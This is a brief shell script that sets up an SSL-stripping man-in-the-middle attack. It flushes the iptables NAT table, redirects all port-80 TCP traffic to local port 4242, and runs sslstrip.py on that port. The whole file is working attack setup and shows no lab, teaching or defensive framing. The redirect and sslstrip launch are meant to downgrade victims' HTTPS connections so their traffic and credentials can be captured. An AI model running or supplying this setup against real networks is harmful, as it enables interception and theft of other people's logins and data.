#!/bin/sh

PROXY_PORT=4242

iptables -t nat -F
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $PROXY_PORT

/mnt/host/sslstrip.py $PROXY_PORT
